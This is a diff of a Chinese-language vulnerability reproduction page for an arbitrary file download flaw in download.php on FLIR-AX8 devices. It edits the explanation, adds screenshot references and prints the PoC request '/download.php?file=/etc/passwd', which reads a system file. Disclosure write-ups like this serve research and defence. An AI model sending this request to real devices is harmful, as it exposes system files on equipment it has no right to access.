@@ -14,11 +14,15 @@ FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞
 
 ## 漏洞复现
 
-出现漏洞的文件为 `download.php`
+登录页面
+
+![img](../../../.vuepress/public/img/1662985620542-08eeac2c-70ee-475d-979d-52f4c9ec3be4-20220912212120399.png)
+
+出现漏洞的文件为 **download.php**
 
 ```php
 <?php
-/`
+/**
  * Copyright 2012 Armand Niculescu - MediaDivision.com
  * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
  * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
@@ -164,19 +168,10 @@ else
 ?>
 ```
 
-
-
-简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件
-
-
+验证POC
 
 ```plain
 /download.php?file=/etc/passwd
 ```
 
-
-
-![img](../../../.vuepress/public/img/fl-1.png)
-
-
-
+![img](../../../.vuepress/public/img/1662985662585-c79e5e7d-48c8-4c62-8108-0a29c34c8cac.png)
